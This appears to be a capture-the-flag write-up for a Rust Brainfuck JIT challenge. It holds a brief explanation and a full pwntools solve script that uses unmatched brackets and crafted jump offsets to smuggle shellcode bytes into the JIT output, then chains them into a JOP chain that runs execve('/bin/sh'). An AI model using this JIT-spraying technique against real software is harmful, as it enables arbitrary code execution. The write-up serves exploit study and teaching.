This is a pretty trickly BF JIT challenge written in Rust.

By adding unmatched opening braces, we can jump to those (now invalid)
offsets after rewriting the JIT'd code.

The actual exploit chain is pretty tricky -- we can control inserted short
jmp offsets, so we can insert arbitrary instructions. The hard part is
finding offsets for valid instructions that don't involve sending several
GBs of data. We can then chain these jumps together to form a JOP chain,
and pop a shell.

Some further logic is explained in the solve script below:

```python
from pwn import *
import struct
from tqdm import tqdm

CHUNK_SIZE = 32768

p = process("./target/debug/bf-jit")

# The intuition for this exploit is as follows:
#
# We can leave leftover dynamic labels in backward offsets by adding extra "[" instructions to the first payload,
# and then "matching" then in the second payload. We must be careful about the order in which this will make us jump
# around with multiple brackets, and it turns out that we end up jumping around inside in like so:
#
#  first payload:             [            [         [           [          [
# second payload:  ]      1    ]     3      ]   4     ]    2      ]    0     ]

# Where the number is the ordering we use to jump around. We can add [] pairs inside (where the number are above) and offset
# into the ending jump (with an arbitrary offset, controlled by how much space is in the [] pair) to execute arbitrary opcodes.

#  first payload:             [            [         [           [          [
# second payload:  ][     1   ]][     3    ]][   4   ]][    2    ]][    0   ]]

# Directly after the bytes from the [] final jump, we need ANOTHER jump (as shown in the first example above) to perform an actual
# jump to the next "payload 1 unmatched" label.

sources = []

instructions_bytes = [
    bytes([0x31, 0xC0, 0xE3, 0xFF]), # xor eax, eax; jrcxz 1
    bytes([0xB0, 0x3B, 0xE3, 0xFF]), # mov al, 3b; jrcxz 1
    bytes([0x51, 0x5F, 0xE3, 0xFF]), # push rcx; pop rdi; jrcxz 1
    bytes([0x31, 0xF6, 0xE3, 0xFF]), # xor esi, esi; jrcxz 1
    bytes([0x31, 0xD2, 0xE3, 0xFF]), # xor edx, edx; jrcxz 1
    bytes([0x0F, 0x05, 0xE3, 0xFF]), # syscall; jrcxz 1
]


log.info("Generating instruction bytes")
instructions = []
for ins_bytes in instructions_bytes:
    instruction, = struct.unpack("<I", ins_bytes)
    instructions.append(instruction)

BRACKET_OPCODE_BYTES = 0x0A
INCREMENT_OPCODE_BYTES = 0x3
INSTRUCTION_BACKWARDS_OFFSET = 0x4
SHELL_STRING = b"/bin/sh"

log.info("Generating BF code to store /bin/sh in memory")
shell_bf = b""
for char in SHELL_STRING:
    shell_bf += b"+" * char
    shell_bf += b">"
shell_bf += b"<" * len(SHELL_STRING)

# We use the "offset" of custom jump instructions to give us 4 bytes of opcode.
# Since we control (negative) jump length, we can execute arbitrary instructions.
# We want instructions as close to FF_FF_FF_FF as possible (the further back the jump is, the more bytes we need to send).

log.info("Generating negated backwards jump offsets for instruction storage")
instructions_negated = [(1 << 32) - ins - BRACKET_OPCODE_BYTES for ins in instructions]

log.info("Generating first payload to store extra jump offsets")
first_payload_first_half = b""
first_payload_second_half = b""

first_payload_first_half += shell_bf
first_payload_first_half += b"A" * BRACKET_OPCODE_BYTES

for i, ins_neg in enumerate(instructions_negated):
    this_part = b""
    this_part += b"A" * (ins_neg + (2 * BRACKET_OPCODE_BYTES))
    this_part += b"["

    if i % 2 == 0:
        first_payload_second_half = this_part + first_payload_second_half
    else:
        first_payload_first_half += this_part

first_payload = first_payload_first_half + first_payload_second_half
first_payload += b"+" * 100

sources.append(first_payload)

log.info("Generating second payload to jump to first payload jump offsets")

second_payload = b""

second_payload_first_half = b""
second_payload_second_half = b""

log.info("Generating payload to populate first bytes of tape to \"/bin/sh\"")
second_payload_first_half += shell_bf
second_payload_first_half += b"]"
second_payload_first_half += b"A" * (BRACKET_OPCODE_BYTES + INSTRUCTION_BACKWARDS_OFFSET)

for i, ins_neg in enumerate(instructions_negated):
    this_part = b""
    this_part += b"["
    this_part += b"A" * ins_neg
    this_part += b"]"

    if i < len(instructions_negated) - 1:
        this_part += b"]"
    else:
        this_part += b"A" * BRACKET_OPCODE_BYTES

    if i % 2 == 0:
        second_payload_second_half = this_part + second_payload_second_half
    else:
        second_payload_first_half += this_part

second_payload = second_payload_first_half + second_payload_second_half
sources.append(second_payload)

for i, source in enumerate(sources):
    p.recvuntil(b"program length: ").decode()

    log.info(f"Sending payload {i + 1}, {len(source)} bytes")
    p.sendline(f"{len(source)}".encode())

    p.recvuntil(b"program source: ").decode()
    with tqdm(total=len(source), unit="bytes") as pbar:
        for chunk in (source[i:i+CHUNK_SIZE] for i in range(0, len(source), CHUNK_SIZE)):
            p.send(chunk)
            pbar.update(len(chunk))

log.info("Now executing /bin/sh JOP chain")

log.info("Enjoy your shell!")
p.interactive()
```
